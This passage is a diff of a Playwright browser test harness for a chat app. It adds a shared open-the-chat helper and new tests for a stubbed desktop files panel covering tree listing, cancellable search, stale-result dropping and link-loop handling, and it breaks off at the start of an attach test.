@@ -12,6 +12,7 @@ import {
   LEAVING_ATTRIBUTE as leavingAttribute,
 } from "../src/app/handoff.ts";
 import { zipSync, strToU8 } from "fflate";
+import { fileURLToPath } from "node:url";
 
 const APP = "http://localhost:5173";
 const CONV_KEY = "crescent-chat.conversations.v1";
@@ -40,6 +41,14 @@ async function seed(page, { settings = null, convos = [], theme = "light" }) {
 
 async function stored(page, key) {
   return page.evaluate((k) => localStorage.getItem(k), key);
+}
+
+/** Screenshots land in chat/shots from any working directory: `npm run`
+    resolves from chat/, but `node scripts/verify.mjs` from the repo root let
+    Playwright resolve "shots/..." against the root and grow a stray tree
+    there — the anchoring shots.mjs already has, applied here too. */
+async function shot(page, path) {
+  await page.screenshot({ path: fileURLToPath(new URL(`../${path}`, import.meta.url)) });
 }
 
 const okSettings = (model) => ({
@@ -87,11 +96,13 @@ async function openSidebar(page, titlePart) {
   await page.waitForTimeout(400);
 }
 
-/**
- * Open the app at the chat. The brain is the home surface now, so a `goto`
- * lands on its writing bar and the composer is one click away — the same
- * conditional click `shots.mjs` has made since that change.
- */
+/** Open the app AT THE CHAT. The brain is the home page now, so most states
+    in this file live one click past it — the writing bar's Chat button. This
+    harness used to `goto` and fill the composer at once, which stopped working
+    the day the home surface changed, and those tests have been timing out
+    since. The click is conditional so it cannot break if the landing view
+    moves again. (The same helper, with the same comment, is `openApp` in
+    `shots.mjs` — one convention across both harnesses, not two.) */
 async function openChat(page) {
   await page.goto(APP);
   const chat = page.locator(".brain-bar-chat");
@@ -255,6 +266,56 @@ async function seedOnce(page, settings) {
   }, settings);
 }
 
+/**
+ * The disk half of the desktop door, stubbed for the browser: answers the
+ * four files commands from fixture data and records every call, so a test
+ * can assert what the panel asked of Rust. Search hits travel on the
+ * `brain_files_search` event, so listen is captured and `__EMIT_FILES__`
+ * lets the test play the batches — including a late one from a search the
+ * user already replaced, which is exactly the arrival the page must drop.
+ */
+async function stubFileDoor(page, { roots = null, listings = {}, read = [], search = null } = {}) {
+  await page.addInitScript(
+    ({ roots, listings, read, search }) => {
+      window.__FILE_CALLS__ = [];
+      // The real bus unlistens ONE registration, not every listener an
+      // event happens to have — removal here is identity-scoped the same
+      // way, or a StrictMode remount reads as a leak that is not one.
+      window.__FILE_LISTENERS__ = {};
+      window.__EMIT_FILES__ = (payload) => {
+        const handlers = window.__FILE_LISTENERS__["brain_files_search"];
+        if (handlers) for (const handler of [...handlers]) handler(payload);
+      };
+      const asBuffer = (bytes) => {
+        const buffer = new ArrayBuffer(bytes.length);
+        new Uint8Array(buffer).set(bytes);
+        return buffer;
+      };
+      window.__TAURI__ = {
+        core: {
+          invoke: async (command, args) => {
+            window.__FILE_CALLS__.push({ command, args });
+            if (command === "brain_files_roots") return roots;
+            if (command === "brain_files_list") return listings[args.path] ?? null;
+            if (command === "brain_files_read") return asBuffer(read);
+            if (command === "brain_files_search") return { ...(search ?? {}), id: args.id };
+            return null;
+          },
+        },
+        event: {
+          listen: async (event, handler) => {
+            (window.__FILE_LISTENERS__[event] ??= new Set()).add(handler);
+            return () => {
+              window.__FILE_LISTENERS__[event]?.delete(handler);
+            };
+          },
+        },
+      };
+    },
+    { roots, listings, read, search },
+  );
+}
+
 const toolSettings = (model, webTools = true) => ({
   endpoint: "http://127.0.0.1:18081/ok",
   token: "t",
@@ -292,7 +353,7 @@ const tests = {
         ]),
       );
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     const keys = await page.evaluate(() => ({ ...localStorage }));
     check("migrate: old key removed", !("crescent-chat.conversations.v1" in keys));
@@ -318,7 +379,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage();
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Persist me.", "line is open");
     await page.waitForFunction(() => document.querySelector(".composer-stop") === null, null, {
@@ -343,10 +404,10 @@ const tests = {
     const seedBoth = async (page) => seed(page, { settings: okSettings("x") });
     const p1 = await ctx.newPage();
     await seedBoth(p1);
-    await p1.goto(APP);
+    await openChat(p1);
     await p1.waitForTimeout(1000);
     const p2 = await ctx.newPage();
-    await p2.goto(APP);
+    await openChat(p2);
     await p2.waitForTimeout(1000);
     check("multiwindow: p2 starts empty", (await p2.locator(".sidebar-row").count()) === 0);
     await p1.getByRole("textbox", { name: "Message" }).fill("From window one.");
@@ -373,7 +434,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage();
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1000);
     await page.evaluate(() => {
       // Fill until the disk actually refuses, then top up at 256B granularity.
@@ -407,7 +468,7 @@ const tests = {
     const banner = page.locator(".storage-banner");
     check("quota: banner shown", (await banner.count()) === 1);
     check("quota: banner names storage", ((await banner.count()) === 1 && await banner.textContent())?.includes("storage is full") ?? false);
-    await page.screenshot({ path: "shots/31-quota.png" });
+    await shot(page, "shots/31-quota.png");
     await browser.close();
   },
   // The composed URL is shown and correct for every endpoint shape.
@@ -424,7 +485,7 @@ const tests = {
       const browser = await chromium.launch({ args: ["--no-sandbox"] });
       const page = await browser.newPage();
       await seed(page, { settings: { endpoint, token: "t", model: "x" } });
-      await page.goto(APP);
+      await openChat(page);
       await page.waitForTimeout(1200);
       await sendAndWait(page, "Hello?", "did not accept the key");
       const shown = await page.locator(".error-url").textContent();
@@ -437,7 +498,7 @@ const tests = {
     await seed(page, {
       settings: { endpoint: "http://127.0.0.1:18081/ok/v1", token: "t", model: "x" },
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Hello?", "line is open");
     check("badurl: /v1 base streams (no doubling)", true);
@@ -450,7 +511,7 @@ const tests = {
     await seed(page, {
       settings: { endpoint: "http://127.0.0.1:18081/forbidden", token: "t", model: "x" },
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Hello?", "refused the key");
     const body = await page.locator(".thread").textContent();
@@ -462,7 +523,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage();
     await seed(page, { settings: okSettings("split-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Split it.", "stopped halfway");
     const body = await page.locator(".thread").textContent();
@@ -475,12 +536,12 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage();
     await seed(page, { settings: okSettings("cut-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Talk then die.", "stopped halfway");
     const body = await page.locator(".thread").textContent();
     check("cut: partial text kept", (body ?? "").includes("Working through this"));
-    await page.screenshot({ path: "shots/33-cut.png" });
+    await shot(page, "shots/33-cut.png");
     await browser.close();
   },
 
@@ -488,7 +549,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage();
     await seed(page, { settings: okSettings("emptycut-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Say nothing.", "not as a chat stream");
     check("emptycut: honest diagnosis", true);
@@ -499,7 +560,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage();
     await seed(page, { settings: okSettings("json-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Plain JSON?", "Non-streaming reply");
     check("json: non-streaming body surfaces", true);
@@ -511,12 +572,12 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage();
     await seed(page, { settings: okSettings("html-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "A page?", "not as a chat stream");
     const shown = await page.locator(".error-url").textContent();
     check("html: shows called URL", (shown ?? "").includes("/ok/v1/chat/completions"));
-    await page.screenshot({ path: "shots/32-html.png" });
+    await shot(page, "shots/32-html.png");
     await browser.close();
   },
 
@@ -526,12 +587,12 @@ const tests = {
     await seed(page, {
       settings: { endpoint: "http://127.0.0.1:18999", token: "t", model: "x" },
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Nobody home?", "could not be reached");
     const shown = await page.locator(".error-url").textContent();
     check("network: shows called URL", (shown ?? "").includes("127.0.0.1:18999/v1/chat/completions"));
-    await page.screenshot({ path: "shots/34-network.png" });
+    await shot(page, "shots/34-network.png");
     await browser.close();
   },
 
@@ -540,7 +601,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("slow-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     const say = async (text) => {
       await page.getByRole("textbox", { name: "Message" }).fill(text);
@@ -583,7 +644,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.getByRole("textbox", { name: "Message" }).click();
     await page.keyboard.press("Control+k");
@@ -609,7 +670,7 @@ const tests = {
         },
       ],
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.locator(".sidebar-row").first().hover();
     await page.getByRole("button", { name: "Rename" }).click();
@@ -642,7 +703,7 @@ const tests = {
         },
       ],
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await openSidebar(page, "Doomed");
     await page.locator(".sidebar-row").first().hover();
@@ -680,7 +741,7 @@ const tests = {
       localStorage.setItem("crescent-chat.index.v2", JSON.stringify(index));
       localStorage.setItem("crescent-chat.migrated.v2", "1");
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1500);
     check("search1000: rows render without payloads", (await page.locator(".sidebar-row").count()) > 10);
     const t0 = Date.now();
@@ -873,7 +934,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("think-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Count the sheep.", "8 sheep left");
     // The duration persists after [DONE], one tick behind the last token:
@@ -894,7 +955,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("thinkonly-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Think, don't speak.", "Thought for");
     check("thinkonly: cloud present", (await page.locator(".thought").count()) === 1);
@@ -908,7 +969,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Just answer.", "line is open");
     check("plain: zero clouds", (await page.locator(".thought").count()) === 0);
@@ -920,7 +981,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("both-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Both at once.", "eight sheep left.");
     await waitSummary(page, "both: summary settled");
@@ -937,7 +998,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("splitthink-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Torn thinking.", "Answered.");
     await waitSummary(page, "splitthink: summary settled");
@@ -953,7 +1014,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("longthink-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Think hard.", "8 sheep left");
     await waitSummary(page, "longthink: summary settled");
@@ -978,7 +1039,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("slowthink-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.getByRole("textbox", { name: "Message" }).fill("Think slowly.");
     await page.getByRole("textbox", { name: "Message" }).press("Enter");
@@ -1001,7 +1062,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("vllm-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "vLLM style.", "8 sheep left");
     check("vllm: second field name read", (await page.locator(".thought").count()) === 1);
@@ -1013,7 +1074,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("emptywins-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Both names, one empty.", "Answered.");
     await waitSummary(page, "emptywins: summary settled");
@@ -1030,7 +1091,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("bothfull-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Both names full.", "Answered.");
     await waitSummary(page, "bothfull: summary settled");
@@ -1047,7 +1108,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("jsonthink-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "JSON thinking.", "gave no answer");
     check("jsonthink: cloud present", (await page.locator(".thought").count()) === 1);
@@ -1072,7 +1133,7 @@ const tests = {
       };
     });
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.evaluate(() => {
       window.__setItems = 0;
@@ -1154,7 +1215,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     const text = `Report body. ${"x".repeat(3985)}`;
     await page.locator('.composer input[type="file"]').setInputFiles([
@@ -1194,7 +1255,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     // Listener starts after load: only parsing-time requests count, and the
     // configured endpoint is legitimate traffic — third parties are not.
@@ -1223,7 +1284,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.locator('.composer input[type="file"]').setInputFiles([
       {
@@ -1257,7 +1318,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.evaluate(([name, bytes]) => {
       const file = new File([new Uint8Array(bytes)], name, { type: "text/plain" });
@@ -1277,7 +1338,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.locator('.composer input[type="file"]').setInputFiles([
       { name: "run.exe", mimeType: "application/octet-stream", buffer: Buffer.from("MZ") },
@@ -1296,12 +1357,574 @@ const tests = {
     await browser.close();
   },
 
+  // The files panel's tree: roots from Rust, folders that expand, a folder
+  // that was capped saying so on screen.
+  async filestree() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await stubFileDoor(page, {
+      roots: { roots: ["/"], home: "/Users/marco" },
+      listings: {
+        "/Users/marco": {
+          path: "/Users/marco",
+          truncated: false,
+          entries: [
+            { name: "Documents", path: "/Users/marco/Documents", is_dir: true, kind: "other", bytes: 0, modified_ms: null },
+            { name: "Everything", path: "/Users/marco/Everything", is_dir: true, kind: "other", bytes: 0, modified_ms: null },
+            { name: "readme.txt", path: "/Users/marco/readme.txt", is_dir: false, kind: "text", bytes: 12, modified_ms: null },
+          ],
+        },
+        "/Users/marco/Documents": {
+          path: "/Users/marco/Documents",
+          truncated: false,
+          entries: [
+            { name: "notes.txt", path: "/Users/marco/Documents/notes.txt", is_dir: false, kind: "text", bytes: 5, modified_ms: null },
+          ],
+        },
+        "/Users/marco/Everything": {
+          path: "/Users/marco/Everything",
+          truncated: true,
+          skipped: 2,
+          entries: [
+            { name: "a.txt", path: "/Users/marco/Everything/a.txt", is_dir: false, kind: "text", bytes: 1, modified_ms: null },
+          ],
+        },
+      },
+    });
+    await seed(page, { settings: okSettings("x") });
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await sendAndWait(page, "Hello.", "line is open");
+    await page.getByRole("button", { name: "Toggle the files panel" }).click();
+    await page.getByRole("tab", { name: "Files" }).click();
+    await page.waitForSelector(".files-tree");
+    const tree = (await page.locator(".files-tree").textContent()) ?? "";
+    check("filestree: roots listed", tree.includes("Home") && tree.includes("/"), tree.slice(0, 80));
+    // Roots start collapsed: Home opens first, Documents is inside it.
+    await page.locator(".files-open", { hasText: "Home" }).click();
+    await page.waitForTimeout(400);
+    await page.locator(".files-open", { hasText: "Documents" }).click();
+    await page.waitForTimeout(400);
+    check(
+      "filestree: a folder expands to its rows",
+      ((await page.locator(".files-tree").textContent()) ?? "").includes("notes.txt"),
+    );
+    await page.locator(".files-open", { hasText: "Everything" }).click();
+    await page.waitForTimeout(400);
+    check(
+      "filestree: a capped folder says so",
+      ((await page.locator(".files-tree").textContent()) ?? "").includes("First 500 of this folder shown"),
+      "the truncated flag never reached the screen",
+    );
+    check(
+      "filestree: a folder that lost rows says how many",
+      ((await page.locator(".files-tree").textContent()) ?? "").includes("2 entries here could not be read."),
+      "the skipped count never reached the screen",
+    );
+    await browser.close();
+  },
+
+  // The search: batches render as they arrive, a late batch from a
+  // superseded search is dropped, the skipped and limited facts are shown,
+  // and switching tabs removes the listener.
+  async filessearch() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await stubFileDoor(page, {
+      roots: { roots: ["/"], home: "/Users/marco" },
+      listings: {
+        "/Users/marco": {
+          path: "/Users/marco",
+          truncated: false,
+          skipped: 0,
+          entries: [
+            { name: "Documents", path: "/Users/marco/Documents", is_dir: true, kind: "other", bytes: 0, modified_ms: null },
+          ],
+        },
+      },
+      // via_index on: this run answers from the Mac's index, and the page
+      // owes the owner that fact on screen.
+      search: { hits: 0, skipped: 0, limited: false, cancelled: false, via_index: true },
+    });
+    await seed(page, { settings: okSettings("x") });
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await sendAndWait(page, "Hello.", "line is open");
+    await page.getByRole("button", { name: "Toggle the files panel" }).click();
+    await page.getByRole("tab", { name: "Files" }).click();
+    await page.waitForSelector(".files-search");
+
+    const emit = (payload) => page.evaluate((p) => window.__EMIT_FILES__(p), payload);
+    // The page puts a fresh generation id on every submit; the test reads
+    // it back from the calls it saw, because only the page knows it.
+    const lastId = async () =>
+      (await page.evaluate(() => window.__FILE_CALLS__))
+        .filter((call) => call.command === "brain_files_search")
+        .pop()?.args?.id;
+    const box = page.getByRole("textbox", { name: "Search by name or path" });
+    await box.fill("notes");
+    await box.press("Enter");
+    await page.waitForTimeout(300);
+    const asked = (await page.evaluate(() => window.__FILE_CALLS__))
+      .filter((call) => call.command === "brain_files_search")
+      .pop();
+    check(
+      "filessearch: the words, scope and generation crossed to Rust",
+      asked?.args?.query === "notes" && asked?.args?.scope === "/Users/marco" && typeof asked?.args?.id === "number",
+      JSON.stringify(asked?.args),
+    );
+    const firstId = await lastId();
+    await emit({
+      id: firstId,
+      query: "notes",
+      matches: [{ name: "notes.txt", path: "/Users/marco/Documents/notes.txt", is_dir: false, kind: "text", score: 40 }],
+      skipped: 0,
+      limited: false,
+      done: false,
+    });
+    await page.waitForTimeout(300);
+    check(
+      "filessearch: a batch renders as it arrives",
+      ((await page.locator(".files-results").textContent()) ?? "").includes("notes.txt"),
+    );
+
+    // The user replaces the search; the old one's late batch must be
+    // dropped by comparing the generation, not assumed impossible.
+    await box.fill("other");
+    await box.press("Enter");
+    await page.waitForTimeout(200);
+    const secondId = await lastId();
+    await emit({
+      id: firstId,
+      query: "notes",
+      matches: [{ name: "ghost.txt", path: "/stale/ghost.txt", is_dir: false, kind: "text", score: 90 }],
+      skipped: 0,
+      limited: false,
+      done: false,
+    });
+    await emit({
+      id: secondId,
+      query: "other",
+      matches: [{ name: "real.md", path: "/fresh/real.md", is_dir: false, kind: "text", score: 50 }],
+      skipped: 0,
+      limited: false,
+      done: false,
+    });
+    await emit({ id: secondId, query: "other", matches: [], skipped: 12, limited: true, done: true, via_index: true });
+    await page.waitForTimeout(400);
+    const results = (await page.locator(".files-results").textContent()) ?? "";
+    check(
+      "filessearch: a late batch from a superseded search is discarded",
+      !results.includes("ghost.txt") && results.includes("real.md"),
+      results.slice(0, 120),
+    );
+    check(
+      "filessearch: results reset when the search is replaced",
+      !results.includes("notes.txt"),
+      "the first search's rows outlived their query",
+    );
+    const notes = (await page.locator(".files-notes").textContent()) ?? "";
+    check("filessearch: skipped is a fact on the screen", notes.includes("Skipped 12"), notes.trim());
+    check("filessearch: limited is a fact on the screen", notes.includes("First 500 shown"), notes.trim());
+    check(
+      "filessearch: an index answer says it searched less",
+      notes.includes("fast index"),
+      notes.trim(),
+    );
+
+    // Moving the search to another folder clears the board: nothing on
+    // screen may claim a scope it did not search. Documents lives inside
+    // Home, which starts collapsed.
+    await page.locator(".files-open", { hasText: "Home" }).click();
+    await page.waitForTimeout(300);
+    const documentsLine = page.locator(".files-line", { hasText: "Documents" }).first();
+    await documentsLine.hover();
+    await documentsLine.locator(".files-here").click();
+    await page.waitForTimeout(300);
+    check(
+      "filessearch: changing scope clears the old results",
+      (await page.locator(".files-results").count()) === 0,
+      "the root search's rows stayed under the new scope",
+    );
+    check(
+      "filessearch: changing scope stops the running search",
+      ((await page.evaluate(() => window.__FILE_CALLS__))
+        .filter((call) => call.command === "brain_files_search")
+        .pop()?.args?.query ?? "none") === "",
+      "no empty-query stop crossed to Rust",
+    );
+    const scopeLine = (await page.locator(".files-scope-line").textContent()) ?? "";
+    check("filessearch: the new scope is the one named", scopeLine.includes("/Users/marco/Documents"), scopeLine.trim());
+
+    // Leaving the tab unmounts the browser, its listener, and its search.
+    // First a search is left RUNNING (the scope change above stops its own;
+    // unmounting with nothing live would prove nothing), and the stops are
+    // counted from that point — crediting the earlier stop to the unmount
+    // would mask a missing cancel.
+    await box.fill("leaf");
+    await box.press("Enter");
+    await page.waitForTimeout(300);
+    const stopsBefore = (await page.evaluate(() => window.__FILE_CALLS__))
+      .filter((call) => call.command === "brain_files_search" && call.args?.query === "").length;
+    await page.getByRole("tab", { name: "Attached" }).click();
+    await page.waitForTimeout(300);
+    const listening = await page.evaluate(
+      () => window.__FILE_LISTENERS__["brain_files_search"]?.size ?? 0,
+    );
+    check("filessearch: the listener is removed on unmount", listening === 0, `${listening} still subscribed`);
+    const stops = (await page.evaluate(() => window.__FILE_CALLS__))
+      .filter((call) => call.command === "brain_files_search" && call.args?.query === "");
+    check(
+      "filessearch: unmounting cancels the Rust search",
+      stops.length === stopsBefore + 1,
+      `${stops.length} stops after unmount, ${stopsBefore} before it — the panel left a whole-disk walk running with nobody watching`,
+    );
+    await browser.close();
+  },
+
+  // The same words submitted twice are two searches. A stale batch from the
+  // replaced one carries the same query, so only the generation id can tell
+  // it apart — this is the race the different-query test cannot see.
+  async samequery() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await stubFileDoor(page, {
+      roots: { roots: ["/"], home: "/Users/marco" },
+      listings: {},
+      search: { hits: 0, skipped: 0, limited: false, cancelled: false, via_index: false },
+    });
+    await seed(page, { settings: okSettings("x") });
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await sendAndWait(page, "Hello.", "line is open");
+    await page.getByRole("button", { name: "Toggle the files panel" }).click();
+    await page.getByRole("tab", { name: "Files" }).click();
+    await page.waitForSelector(".files-search");
+
+    const emit = (payload) => page.evaluate((p) => window.__EMIT_FILES__(p), payload);
+    const lastId = async () =>
+      (await page.evaluate(() => window.__FILE_CALLS__))
+        .filter((call) => call.command === "brain_files_search")
+        .pop()?.args?.id;
+    const box = page.getByRole("textbox", { name: "Search by name or path" });
+
+    await box.fill("notes");
+    await box.press("Enter");
+    await page.waitForTimeout(200);
+    const firstId = await lastId();
+    await box.fill("notes");
+    await box.press("Enter");
+    await page.waitForTimeout(200);
+    const secondId = await lastId();
+    check(
+      "samequery: a resubmit is a new generation",
+      firstId !== secondId && typeof secondId === "number",
+      `first ${firstId}, second ${secondId}`,
+    );
+
+    // The first run's batch arrives late with the SAME words. Only the id
+    // can refuse it.
+    await emit({
+      id: firstId,
+      query: "notes",
+      matches: [{ name: "stale.txt", path: "/old/stale.txt", is_dir: false, kind: "text", score: 90 }],
+      skipped: 0,
+      limited: false,
+      done: false,
+    });
+    await emit({
+      id: secondId,
+      query: "notes",
+      matches: [{ name: "fresh.txt", path: "/new/fresh.txt", is_dir: false, kind: "text", score: 40 }],
+      skipped: 0,
+      limited: false,
+      done: false,
+    });
+    await page.waitForTimeout(400);
+    const results = (await page.locator(".files-results").textContent()) ?? "";
+    check(
+      "samequery: the replaced run's batch is refused by id",
+      !results.includes("stale.txt") && results.includes("fresh.txt"),
+      results.slice(0, 120),
+    );
+    await browser.close();
+  },
+
+  // A link that resolves up the tree would render the same expanded row at
+  // every depth, forever, because expansion is keyed by path alone. The
+  // ancestor chain is what stops it.
+  async filescycle() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    const loopRow = { name: "self", path: "/loop", is_dir: true, kind: "other", bytes: 0, modified_ms: null };
+    await stubFileDoor(page, {
+      roots: { roots: ["/"], home: "/loop" },
+      listings: {
+        // Expanding /loop returns /loop's own children — including the row
+        // whose expansion state is the one already open above it.
+        "/loop": {
+          path: "/loop",
+          truncated: false,
+          skipped: 0,
+          entries: [loopRow, { name: "real.txt", path: "/loop/real.txt", is_dir: false, kind: "text", bytes: 3, modified_ms: null }],
+        },
+      },
+      search: { hits: 0, skipped: 0, limited: false, cancelled: false, via_index: false },
+    });
+    await seed(page, { settings: okSettings("x") });
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await sendAndWait(page, "Hello.", "line is open");
+    await page.getByRole("button", { name: "Toggle the files panel" }).click();
+    await page.getByRole("tab", { name: "Files" }).click();
+    await page.waitForSelector(".files-tree");
+    // Home IS /loop here: expanding it once opens the cycle, and the child
+    // `self` row points straight back at it. Without the ancestor guard
+    // the renderer recurses on this very expand — the page dies of stack
+    // exhaustion and nothing below ever answers.
+    await page.locator(".files-open", { hasText: "Home" }).click();
+    const alive = await page
+      .locator(".files-tree .files-name", { hasText: "real.txt" })
+      .first()
+      .textContent({ timeout: 5000 })
+      .catch(() => null);
+    check("filescycle: the tree renders inside a link loop", alive !== null, "the renderer never came back");
+    // The guard's own behaviour, apart from any depth backstop: a row does
+    // not stand expanded inside its own subtree. A depth cap alone would
+    // render `self` expanded 24 times over and still "survive".
+    const nested = await page
+      .locator(".files-children .files-open[aria-expanded='true']", { hasText: "self" })
+      .count();
+    check(
+      "filescycle: the loop row is not expanded inside its own subtree",
+      nested === 0,
+      `${nested} nested copies of the row rendered expanded`,
+    );
+    // The self row is present, shown collapsed inside its own subtree, and
+    // clicking it collapses the parent rather than recursing.
+    await page.locator(".files-tree .files-open", { hasText: "self" }).first().click();
+    await page.waitForTimeout(300);
+    await page.locator(".files-open", { hasText: "Home" }).click();
+    const back = await page
+      .locator(".files-tree .files-name", { hasText: "real.txt" })
+      .first()
+      .textContent({ timeout: 5000 })
+      .catch(() => null);
+    check("filescycle: the loop row toggles instead of hanging", back !== null, "the self row never came back");
+    await browser.close();
+  },
+
+  // Attach from the computer: Rust reads the bytes, the page wraps them in a
+  // File with the row's name, and the composer's own path does the rest.
+  async filesattach() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
